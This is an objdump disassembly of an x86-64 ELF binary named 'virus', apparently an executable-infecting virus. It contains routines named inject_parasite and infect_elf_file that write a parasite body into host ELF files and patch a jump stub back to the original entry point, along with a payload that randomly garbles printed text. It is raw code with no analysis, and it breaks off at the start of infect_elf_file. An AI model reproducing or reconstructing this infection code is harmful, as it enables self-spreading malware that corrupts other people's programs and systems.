
./virus:     file format elf64-x86-64


Disassembly of section .text:

000000000040019c <_start>:
  40019c:	f3 0f 1e fa          	endbr64 
  4001a0:	55                   	push   rbp
  4001a1:	48 89 e5             	mov    rbp,rsp

00000000004001a4 <real_start>:
  4001a4:	54                   	push   rsp
  4001a5:	55                   	push   rbp
  4001a6:	50                   	push   rax
  4001a7:	53                   	push   rbx
  4001a8:	51                   	push   rcx
  4001a9:	52                   	push   rdx
  4001aa:	41 50                	push   r8
  4001ac:	41 51                	push   r9
  4001ae:	41 52                	push   r10
  4001b0:	41 53                	push   r11
  4001b2:	41 54                	push   r12
  4001b4:	41 55                	push   r13
  4001b6:	41 56                	push   r14
  4001b8:	41 57                	push   r15
  4001ba:	e8 34 1b 00 00       	call   401cf3 <do_main>
  4001bf:	41 5f                	pop    r15
  4001c1:	41 5e                	pop    r14
  4001c3:	41 5d                	pop    r13
  4001c5:	41 5c                	pop    r12
  4001c7:	41 5b                	pop    r11
  4001c9:	41 5a                	pop    r10
  4001cb:	41 59                	pop    r9
  4001cd:	41 58                	pop    r8
  4001cf:	5a                   	pop    rdx
  4001d0:	59                   	pop    rcx
  4001d1:	5b                   	pop    rbx
  4001d2:	58                   	pop    rax
  4001d3:	5d                   	pop    rbp
  4001d4:	5c                   	pop    rsp
  4001d5:	48 83 c4 08          	add    rsp,0x8
  4001d9:	e9 7f 2b 00 00       	jmp    402d5d <end_code>
  4001de:	90                   	nop
  4001df:	5d                   	pop    rbp
  4001e0:	c3                   	ret    

00000000004001e1 <evil_puts>:
  4001e1:	f3 0f 1e fa          	endbr64 
  4001e5:	55                   	push   rbp
  4001e6:	48 89 e5             	mov    rbp,rsp
  4001e9:	48 81 ec 40 04 00 00 	sub    rsp,0x440
  4001f0:	48 89 bd c8 fb ff ff 	mov    QWORD PTR [rbp-0x438],rdi
  4001f7:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  4001fe:	48 89 45 f8          	mov    QWORD PTR [rbp-0x8],rax
  400202:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [rbp-0xc],0x0
  400209:	c7 45 ec 05 00 00 00 	mov    DWORD PTR [rbp-0x14],0x5
  400210:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  400217:	be 00 00 00 00       	mov    esi,0x0
  40021c:	48 89 c7             	mov    rdi,rax
  40021f:	e8 b6 21 00 00       	call   4023da <_gettimeofday>
  400224:	48 8d 85 d0 fb ff ff 	lea    rax,[rbp-0x430]
  40022b:	48 83 c0 08          	add    rax,0x8
  40022f:	48 89 c7             	mov    rdi,rax
  400232:	e8 e1 01 00 00       	call   400418 <_rand>
  400237:	99                   	cdq    
  400238:	f7 7d ec             	idiv   DWORD PTR [rbp-0x14]
  40023b:	89 d0                	mov    eax,edx
  40023d:	89 45 f0             	mov    DWORD PTR [rbp-0x10],eax
  400240:	83 7d f0 03          	cmp    DWORD PTR [rbp-0x10],0x3
  400244:	0f 85 2a 01 00 00    	jne    400374 <evil_puts+0x193>
  40024a:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  400251:	ba 00 04 00 00       	mov    edx,0x400
  400256:	be 00 00 00 00       	mov    esi,0x0
  40025b:	48 89 c7             	mov    rdi,rax
  40025e:	e8 f8 21 00 00       	call   40245b <Memset>
  400263:	e9 e3 00 00 00       	jmp    40034b <evil_puts+0x16a>
  400268:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40026c:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  40026f:	0f be c0             	movsx  eax,al
  400272:	89 c7                	mov    edi,eax
  400274:	e8 6a 29 00 00       	call   402be3 <_toupper>
  400279:	0f be c0             	movsx  eax,al
  40027c:	83 e8 41             	sub    eax,0x41
  40027f:	83 f8 13             	cmp    eax,0x13
  400282:	0f 87 a4 00 00 00    	ja     40032c <evil_puts+0x14b>
  400288:	89 c0                	mov    eax,eax
  40028a:	48 8d 14 85 00 00 00 	lea    rdx,[rax*4+0x0]
  400291:	00 
  400292:	48 8d 05 27 2b 00 00 	lea    rax,[rip+0x2b27]        # 402dc0 <display_skeksi+0x42>
  400299:	8b 04 02             	mov    eax,DWORD PTR [rdx+rax*1]
  40029c:	48 98                	cdqe   
  40029e:	48 8d 15 1b 2b 00 00 	lea    rdx,[rip+0x2b1b]        # 402dc0 <display_skeksi+0x42>
  4002a5:	48 01 d0             	add    rax,rdx
  4002a8:	3e ff e0             	notrack jmp rax
  4002ab:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002ae:	8d 50 01             	lea    edx,[rax+0x1]
  4002b1:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002b4:	48 98                	cdqe   
  4002b6:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x31
  4002bd:	31 
  4002be:	e9 83 00 00 00       	jmp    400346 <evil_puts+0x165>
  4002c3:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002c6:	8d 50 01             	lea    edx,[rax+0x1]
  4002c9:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002cc:	48 98                	cdqe   
  4002ce:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x33
  4002d5:	33 
  4002d6:	eb 6e                	jmp    400346 <evil_puts+0x165>
  4002d8:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002db:	8d 50 01             	lea    edx,[rax+0x1]
  4002de:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002e1:	48 98                	cdqe   
  4002e3:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x35
  4002ea:	35 
  4002eb:	eb 59                	jmp    400346 <evil_puts+0x165>
  4002ed:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  4002f0:	8d 50 01             	lea    edx,[rax+0x1]
  4002f3:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  4002f6:	48 98                	cdqe   
  4002f8:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x37
  4002ff:	37 
  400300:	eb 44                	jmp    400346 <evil_puts+0x165>
  400302:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  400305:	8d 50 01             	lea    edx,[rax+0x1]
  400308:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  40030b:	48 98                	cdqe   
  40030d:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x30
  400314:	30 
  400315:	eb 2f                	jmp    400346 <evil_puts+0x165>
  400317:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40031a:	8d 50 01             	lea    edx,[rax+0x1]
  40031d:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400320:	48 98                	cdqe   
  400322:	c6 84 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],0x34
  400329:	34 
  40032a:	eb 1a                	jmp    400346 <evil_puts+0x165>
  40032c:	8b 45 f4             	mov    eax,DWORD PTR [rbp-0xc]
  40032f:	8d 50 01             	lea    edx,[rax+0x1]
  400332:	89 55 f4             	mov    DWORD PTR [rbp-0xc],edx
  400335:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  400339:	0f b6 12             	movzx  edx,BYTE PTR [rdx]
  40033c:	48 98                	cdqe   
  40033e:	88 94 05 e0 fb ff ff 	mov    BYTE PTR [rbp+rax*1-0x420],dl
  400345:	90                   	nop
  400346:	48 83 45 f8 01       	add    QWORD PTR [rbp-0x8],0x1
  40034b:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  40034f:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400352:	84 c0                	test   al,al
  400354:	74 0d                	je     400363 <evil_puts+0x182>
  400356:	81 7d f4 ff 03 00 00 	cmp    DWORD PTR [rbp-0xc],0x3ff
  40035d:	0f 8e 05 ff ff ff    	jle    400268 <evil_puts+0x87>
  400363:	48 8d 85 e0 fb ff ff 	lea    rax,[rbp-0x420]
  40036a:	48 89 c7             	mov    rdi,rax
  40036d:	e8 e7 27 00 00       	call   402b59 <_puts_nl>
  400372:	eb 14                	jmp    400388 <evil_puts+0x1a7>
  400374:	90                   	nop
  400375:	f3 0f 1e fa          	endbr64 
  400379:	48 8b 85 c8 fb ff ff 	mov    rax,QWORD PTR [rbp-0x438]
  400380:	48 89 c7             	mov    rdi,rax
  400383:	e8 d1 27 00 00       	call   402b59 <_puts_nl>
  400388:	c9                   	leave  
  400389:	c3                   	ret    

000000000040038a <vx_malloc>:
  40038a:	f3 0f 1e fa          	endbr64 
  40038e:	55                   	push   rbp
  40038f:	48 89 e5             	mov    rbp,rsp
  400392:	48 83 ec 10          	sub    rsp,0x10
  400396:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  40039a:	48 89 75 f0          	mov    QWORD PTR [rbp-0x10],rsi
  40039e:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003a2:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003a5:	48 85 c0             	test   rax,rax
  4003a8:	75 46                	jne    4003f0 <vx_malloc+0x66>
  4003aa:	41 b9 00 00 00 00    	mov    r9d,0x0
  4003b0:	49 c7 c0 ff ff ff ff 	mov    r8,0xffffffffffffffff
  4003b7:	b9 22 00 00 00       	mov    ecx,0x22
  4003bc:	ba 03 00 00 00       	mov    edx,0x3
  4003c1:	be 00 00 20 00       	mov    esi,0x200000
  4003c6:	bf 00 00 00 00       	mov    edi,0x0
  4003cb:	e8 8d 1e 00 00       	call   40225d <_mmap>
  4003d0:	48 8b 55 f0          	mov    rdx,QWORD PTR [rbp-0x10]
  4003d4:	48 89 02             	mov    QWORD PTR [rdx],rax
  4003d7:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003db:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003de:	48 83 f8 ff          	cmp    rax,0xffffffffffffffff
  4003e2:	75 0c                	jne    4003f0 <vx_malloc+0x66>
  4003e4:	48 c7 c7 ff ff ff ff 	mov    rdi,0xffffffffffffffff
  4003eb:	e8 b2 1c 00 00       	call   4020a2 <Exit>
  4003f0:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  4003f4:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4003f7:	48 8d 90 00 01 00 00 	lea    rdx,[rax+0x100]
  4003fe:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400402:	48 89 10             	mov    QWORD PTR [rax],rdx
  400405:	48 8b 45 f0          	mov    rax,QWORD PTR [rbp-0x10]
  400409:	48 8b 00             	mov    rax,QWORD PTR [rax]
  40040c:	48 8b 55 f8          	mov    rdx,QWORD PTR [rbp-0x8]
  400410:	48 f7 da             	neg    rdx
  400413:	48 01 d0             	add    rax,rdx
  400416:	c9                   	leave  
  400417:	c3                   	ret    

0000000000400418 <_rand>:
  400418:	55                   	push   rbp
  400419:	48 89 e5             	mov    rbp,rsp
  40041c:	48 89 7d f8          	mov    QWORD PTR [rbp-0x8],rdi
  400420:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400424:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400427:	48 69 c0 6d 4e c6 41 	imul   rax,rax,0x41c64e6d
  40042e:	48 8d 90 39 30 00 00 	lea    rdx,[rax+0x3039]
  400435:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400439:	48 89 10             	mov    QWORD PTR [rax],rdx
  40043c:	48 8b 45 f8          	mov    rax,QWORD PTR [rbp-0x8]
  400440:	48 8b 00             	mov    rax,QWORD PTR [rax]
  400443:	48 8d 90 ff ff 00 00 	lea    rdx,[rax+0xffff]
  40044a:	48 85 c0             	test   rax,rax
  40044d:	48 0f 48 c2          	cmovs  rax,rdx
  400451:	48 c1 f8 10          	sar    rax,0x10
  400455:	25 ff 7f 00 00       	and    eax,0x7fff
  40045a:	5d                   	pop    rbp
  40045b:	c3                   	ret    

000000000040045c <randomly_select_dir>:
  40045c:	55                   	push   rbp
  40045d:	48 89 e5             	mov    rbp,rsp
  400460:	48 83 ec 30          	sub    rsp,0x30
  400464:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  400468:	c7 45 fc 04 00 00 00 	mov    DWORD PTR [rbp-0x4],0x4
  40046f:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  400473:	be 00 00 00 00       	mov    esi,0x0
  400478:	48 89 c7             	mov    rdi,rax
  40047b:	e8 5a 1f 00 00       	call   4023da <_gettimeofday>
  400480:	48 8d 45 e0          	lea    rax,[rbp-0x20]
  400484:	48 83 c0 08          	add    rax,0x8
  400488:	48 89 c7             	mov    rdi,rax
  40048b:	e8 88 ff ff ff       	call   400418 <_rand>
  400490:	99                   	cdq    
  400491:	f7 7d fc             	idiv   DWORD PTR [rbp-0x4]
  400494:	89 d0                	mov    eax,edx
  400496:	89 c0                	mov    eax,eax
  400498:	48 8d 14 c5 00 00 00 	lea    rdx,[rax*8+0x0]
  40049f:	00 
  4004a0:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004a4:	48 01 d0             	add    rax,rdx
  4004a7:	48 8b 00             	mov    rax,QWORD PTR [rax]
  4004aa:	c9                   	leave  
  4004ab:	c3                   	ret    

00000000004004ac <full_path>:
  4004ac:	f3 0f 1e fa          	endbr64 
  4004b0:	55                   	push   rbp
  4004b1:	48 89 e5             	mov    rbp,rsp
  4004b4:	53                   	push   rbx
  4004b5:	48 83 ec 38          	sub    rsp,0x38
  4004b9:	48 89 7d d8          	mov    QWORD PTR [rbp-0x28],rdi
  4004bd:	48 89 75 d0          	mov    QWORD PTR [rbp-0x30],rsi
  4004c1:	48 89 55 c8          	mov    QWORD PTR [rbp-0x38],rdx
  4004c5:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004c9:	48 89 c7             	mov    rdi,rax
  4004cc:	e8 df 26 00 00       	call   402bb0 <_strlen>
  4004d1:	48 89 c3             	mov    rbx,rax
  4004d4:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  4004d8:	48 89 c7             	mov    rdi,rax
  4004db:	e8 d0 26 00 00       	call   402bb0 <_strlen>
  4004e0:	48 01 d8             	add    rax,rbx
  4004e3:	48 8d 50 02          	lea    rdx,[rax+0x2]
  4004e7:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4004eb:	48 89 c6             	mov    rsi,rax
  4004ee:	48 89 d7             	mov    rdi,rdx
  4004f1:	e8 94 fe ff ff       	call   40038a <vx_malloc>
  4004f6:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  4004fa:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4004fe:	48 89 c7             	mov    rdi,rax
  400501:	e8 aa 26 00 00       	call   402bb0 <_strlen>
  400506:	89 c3                	mov    ebx,eax
  400508:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40050c:	48 89 c7             	mov    rdi,rax
  40050f:	e8 9c 26 00 00       	call   402bb0 <_strlen>
  400514:	8d 14 03             	lea    edx,[rbx+rax*1]
  400517:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40051b:	be 00 00 00 00       	mov    esi,0x0
  400520:	48 89 c7             	mov    rdi,rax
  400523:	e8 33 1f 00 00       	call   40245b <Memset>
  400528:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40052c:	48 89 c7             	mov    rdi,rax
  40052f:	e8 7c 26 00 00       	call   402bb0 <_strlen>
  400534:	89 c2                	mov    edx,eax
  400536:	48 8b 4d d0          	mov    rcx,QWORD PTR [rbp-0x30]
  40053a:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  40053e:	48 89 ce             	mov    rsi,rcx
  400541:	48 89 c7             	mov    rdi,rax
  400544:	e8 bf 1e 00 00       	call   402408 <_memcpy>
  400549:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  40054d:	48 89 c7             	mov    rdi,rax
  400550:	e8 5b 26 00 00       	call   402bb0 <_strlen>
  400555:	48 8b 55 e8          	mov    rdx,QWORD PTR [rbp-0x18]
  400559:	48 01 d0             	add    rax,rdx
  40055c:	c6 00 2f             	mov    BYTE PTR [rax],0x2f
  40055f:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400563:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400566:	3c 2e                	cmp    al,0x2e
  400568:	75 14                	jne    40057e <full_path+0xd2>
  40056a:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  40056e:	48 83 c0 01          	add    rax,0x1
  400572:	0f b6 00             	movzx  eax,BYTE PTR [rax]
  400575:	3c 2f                	cmp    al,0x2f
  400577:	75 05                	jne    40057e <full_path+0xd2>
  400579:	48 83 45 d8 02       	add    QWORD PTR [rbp-0x28],0x2
  40057e:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  400582:	48 89 c7             	mov    rdi,rax
  400585:	e8 26 26 00 00       	call   402bb0 <_strlen>
  40058a:	89 c3                	mov    ebx,eax
  40058c:	48 8b 45 d0          	mov    rax,QWORD PTR [rbp-0x30]
  400590:	48 89 c7             	mov    rdi,rax
  400593:	e8 18 26 00 00       	call   402bb0 <_strlen>
  400598:	48 8d 50 01          	lea    rdx,[rax+0x1]
  40059c:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005a0:	48 8d 0c 02          	lea    rcx,[rdx+rax*1]
  4005a4:	48 8b 45 d8          	mov    rax,QWORD PTR [rbp-0x28]
  4005a8:	89 da                	mov    edx,ebx
  4005aa:	48 89 c6             	mov    rsi,rax
  4005ad:	48 89 cf             	mov    rdi,rcx
  4005b0:	e8 53 1e 00 00       	call   402408 <_memcpy>
  4005b5:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4005b9:	48 83 c4 38          	add    rsp,0x38
  4005bd:	5b                   	pop    rbx
  4005be:	5d                   	pop    rbp
  4005bf:	c3                   	ret    

00000000004005c0 <inject_parasite>:
  4005c0:	f3 0f 1e fa          	endbr64 
  4005c4:	55                   	push   rbp
  4005c5:	48 89 e5             	mov    rbp,rsp
  4005c8:	48 81 ec 30 01 00 00 	sub    rsp,0x130
  4005cf:	48 89 bd f8 fe ff ff 	mov    QWORD PTR [rbp-0x108],rdi
  4005d6:	48 89 b5 f0 fe ff ff 	mov    QWORD PTR [rbp-0x110],rsi
  4005dd:	48 89 95 e8 fe ff ff 	mov    QWORD PTR [rbp-0x118],rdx
  4005e4:	48 89 8d e0 fe ff ff 	mov    QWORD PTR [rbp-0x120],rcx
  4005eb:	4c 89 85 d8 fe ff ff 	mov    QWORD PTR [rbp-0x128],r8
  4005f2:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  4005f9:	c7 45 f8 40 00 00 00 	mov    DWORD PTR [rbp-0x8],0x40
  400600:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400607:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40060b:	48 89 45 f0          	mov    QWORD PTR [rbp-0x10],rax
  40060f:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  400616:	48 8b 40 50          	mov    rax,QWORD PTR [rax+0x50]
  40061a:	48 89 45 e8          	mov    QWORD PTR [rbp-0x18],rax
  40061e:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400625:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
  400629:	48 89 45 e0          	mov    QWORD PTR [rbp-0x20],rax
  40062d:	48 8b 85 e8 fe ff ff 	mov    rax,QWORD PTR [rbp-0x118]
  400634:	48 8d 48 68          	lea    rcx,[rax+0x68]
  400638:	48 8d 85 10 ff ff ff 	lea    rax,[rbp-0xf0]
  40063f:	ba 90 00 00 00       	mov    edx,0x90
  400644:	48 89 ce             	mov    rsi,rcx
  400647:	48 89 c7             	mov    rdi,rax
  40064a:	e8 b9 1d 00 00       	call   402408 <_memcpy>
  40064f:	8b 85 28 ff ff ff    	mov    eax,DWORD PTR [rbp-0xd8]
  400655:	89 c0                	mov    eax,eax
  400657:	48 89 c2             	mov    rdx,rax
  40065a:	be 41 02 00 00       	mov    esi,0x241
  40065f:	48 8d 3d aa 27 00 00 	lea    rdi,[rip+0x27aa]        # 402e10 <display_skeksi+0x92>
  400666:	e8 56 1a 00 00       	call   4020c1 <_open>
  40066b:	89 45 dc             	mov    DWORD PTR [rbp-0x24],eax
  40066e:	83 7d dc ff          	cmp    DWORD PTR [rbp-0x24],0xffffffff
  400672:	75 0a                	jne    40067e <inject_parasite+0xbe>
  400674:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400679:	e9 de 01 00 00       	jmp    40085c <inject_parasite+0x29c>
  40067e:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  400681:	48 63 d0             	movsxd rdx,eax
  400684:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400687:	48 98                	cdqe   
  400689:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  40068d:	48 89 ce             	mov    rsi,rcx
  400690:	48 89 c7             	mov    rdi,rax
  400693:	e8 b3 1a 00 00       	call   40214b <_write>
  400698:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40069b:	8b 45 f8             	mov    eax,DWORD PTR [rbp-0x8]
  40069e:	39 45 d8             	cmp    DWORD PTR [rbp-0x28],eax
  4006a1:	74 0a                	je     4006ad <inject_parasite+0xed>
  4006a3:	b8 ff ff ff ff       	mov    eax,0xffffffff
  4006a8:	e9 af 01 00 00       	jmp    40085c <inject_parasite+0x29c>
  4006ad:	e8 90 26 00 00       	call   402d42 <get_rip>
  4006b2:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  4006b9:	48 89 d1             	mov    rcx,rdx
  4006bc:	48 c7 c2 5d 2d 40 00 	mov    rdx,0x402d5d
  4006c3:	48 29 d1             	sub    rcx,rdx
  4006c6:	48 89 ca             	mov    rdx,rcx
  4006c9:	48 29 d0             	sub    rax,rdx
  4006cc:	48 89 45 d0          	mov    QWORD PTR [rbp-0x30],rax
  4006d0:	e8 6d 26 00 00       	call   402d42 <get_rip>
  4006d5:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  4006dc:	48 89 d1             	mov    rcx,rdx
  4006df:	48 c7 c2 72 2d 40 00 	mov    rdx,0x402d72
  4006e6:	48 29 d1             	sub    rcx,rdx
  4006e9:	48 89 ca             	mov    rdx,rcx
  4006ec:	48 29 d0             	sub    rax,rdx
  4006ef:	48 89 45 c8          	mov    QWORD PTR [rbp-0x38],rax
  4006f3:	48 8b 45 c8          	mov    rax,QWORD PTR [rbp-0x38]
  4006f7:	48 2b 45 d0          	sub    rax,QWORD PTR [rbp-0x30]
  4006fb:	89 45 c4             	mov    DWORD PTR [rbp-0x3c],eax
  4006fe:	e8 3f 26 00 00       	call   402d42 <get_rip>
  400703:	48 c7 c2 4f 2d 40 00 	mov    rdx,0x402d4f
  40070a:	48 89 d1             	mov    rcx,rdx
  40070d:	48 c7 c2 5d 2d 40 00 	mov    rdx,0x402d5d
  400714:	48 29 d1             	sub    rcx,rdx
  400717:	48 89 ca             	mov    rdx,rcx
  40071a:	48 29 d0             	sub    rax,rdx
  40071d:	48 89 45 b8          	mov    QWORD PTR [rbp-0x48],rax
  400721:	c7 85 0a ff ff ff 68 	mov    DWORD PTR [rbp-0xf6],0x68
  400728:	00 00 00 
  40072b:	66 c7 85 0e ff ff ff 	mov    WORD PTR [rbp-0xf2],0xc300
  400732:	00 c3 
  400734:	48 8d 85 0a ff ff ff 	lea    rax,[rbp-0xf6]
  40073b:	48 83 c0 01          	add    rax,0x1
  40073f:	48 8b 95 d8 fe ff ff 	mov    rdx,QWORD PTR [rbp-0x128]
  400746:	89 10                	mov    DWORD PTR [rax],edx
  400748:	48 8b 85 e0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x120]
  40074f:	48 8b 40 58          	mov    rax,QWORD PTR [rax+0x58]
  400753:	48 2d 68 42 00 00    	sub    rax,0x4268
  400759:	48 89 45 b0          	mov    QWORD PTR [rbp-0x50],rax
  40075d:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  400760:	48 98                	cdqe   
  400762:	48 29 45 b0          	sub    QWORD PTR [rbp-0x50],rax
  400766:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400769:	48 98                	cdqe   
  40076b:	48 8b 55 b0          	mov    rdx,QWORD PTR [rbp-0x50]
  40076f:	48 8b 4d e8          	mov    rcx,QWORD PTR [rbp-0x18]
  400773:	48 89 ce             	mov    rsi,rcx
  400776:	48 89 c7             	mov    rdi,rax
  400779:	e8 cd 19 00 00       	call   40214b <_write>
  40077e:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400781:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400784:	48 39 45 b0          	cmp    QWORD PTR [rbp-0x50],rax
  400788:	74 0a                	je     400794 <inject_parasite+0x1d4>
  40078a:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40078f:	e9 c8 00 00 00       	jmp    40085c <inject_parasite+0x29c>
  400794:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400797:	48 98                	cdqe   
  400799:	48 8d 8d 0a ff ff ff 	lea    rcx,[rbp-0xf6]
  4007a0:	ba 06 00 00 00       	mov    edx,0x6
  4007a5:	48 89 ce             	mov    rsi,rcx
  4007a8:	48 89 c7             	mov    rdi,rax
  4007ab:	e8 9b 19 00 00       	call   40214b <_write>
  4007b0:	8b 45 c4             	mov    eax,DWORD PTR [rbp-0x3c]
  4007b3:	48 98                	cdqe   
  4007b5:	48 8d 90 62 42 00 00 	lea    rdx,[rax+0x4262]
  4007bc:	48 8b 45 b0          	mov    rax,QWORD PTR [rbp-0x50]
  4007c0:	48 8d 48 06          	lea    rcx,[rax+0x6]
  4007c4:	48 8b 45 e8          	mov    rax,QWORD PTR [rbp-0x18]
  4007c8:	48 01 c1             	add    rcx,rax
  4007cb:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007ce:	48 98                	cdqe   
  4007d0:	48 89 ce             	mov    rsi,rcx
  4007d3:	48 89 c7             	mov    rdi,rax
  4007d6:	e8 70 19 00 00       	call   40214b <_write>
  4007db:	48 8b 85 f0 fe ff ff 	mov    rax,QWORD PTR [rbp-0x110]
  4007e2:	83 c0 40             	add    eax,0x40
  4007e5:	89 45 ac             	mov    DWORD PTR [rbp-0x54],eax
  4007e8:	8b 4d ac             	mov    ecx,DWORD PTR [rbp-0x54]
  4007eb:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  4007ee:	48 98                	cdqe   
  4007f0:	ba 00 00 00 00       	mov    edx,0x0
  4007f5:	48 89 ce             	mov    rsi,rcx
  4007f8:	48 89 c7             	mov    rdi,rax
  4007fb:	e8 03 1a 00 00       	call   402203 <_lseek>
  400800:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  400803:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400806:	3b 45 ac             	cmp    eax,DWORD PTR [rbp-0x54]
  400809:	74 07                	je     400812 <inject_parasite+0x252>
  40080b:	b8 ff ff ff ff       	mov    eax,0xffffffff
  400810:	eb 4a                	jmp    40085c <inject_parasite+0x29c>
  400812:	48 83 45 f0 40       	add    QWORD PTR [rbp-0x10],0x40
  400817:	48 8b 85 40 ff ff ff 	mov    rax,QWORD PTR [rbp-0xc0]
  40081e:	83 e8 40             	sub    eax,0x40
  400821:	89 45 a8             	mov    DWORD PTR [rbp-0x58],eax
  400824:	8b 55 a8             	mov    edx,DWORD PTR [rbp-0x58]
  400827:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  40082a:	48 98                	cdqe   
  40082c:	48 8b 4d f0          	mov    rcx,QWORD PTR [rbp-0x10]
  400830:	48 89 ce             	mov    rsi,rcx
  400833:	48 89 c7             	mov    rdi,rax
  400836:	e8 10 19 00 00       	call   40214b <_write>
  40083b:	89 45 d8             	mov    DWORD PTR [rbp-0x28],eax
  40083e:	8b 45 d8             	mov    eax,DWORD PTR [rbp-0x28]
  400841:	3b 45 a8             	cmp    eax,DWORD PTR [rbp-0x58]
  400844:	74 07                	je     40084d <inject_parasite+0x28d>
  400846:	b8 ff ff ff ff       	mov    eax,0xffffffff
  40084b:	eb 0f                	jmp    40085c <inject_parasite+0x29c>
  40084d:	8b 45 dc             	mov    eax,DWORD PTR [rbp-0x24]
  400850:	89 c7                	mov    edi,eax
  400852:	e8 a0 18 00 00       	call   4020f7 <_close>
  400857:	b8 00 00 00 00       	mov    eax,0x0
  40085c:	c9                   	leave  
  40085d:	c3                   	ret    

000000000040085e <infect_elf_file>:
  40085e:	f3 0f 1e fa          	endbr64 
  400862:	55                   	push   rbp
  400863:	48 89 e5             	mov    rbp,rsp
  400866:	48 81 ec 00 01 00 00 	sub    rsp,0x100
  40086d:	48 89 bd 08 ff ff ff 	mov    QWORD PTR [rbp-0xf8],rdi
  400874:	48 89 b5 00 ff ff ff 	mov    QWORD PTR [rbp-0x100],rsi
  40087b:	c7 45 fc 00 00 00 00 	mov    DWORD PTR [rbp-0x4],0x0
  400882:	48 8b 85 00 ff ff ff 	mov    rax,QWORD PTR [rbp-0x100]
  400889:	48 8b 40 60          	mov    rax,QWORD PTR [rax+0x60]
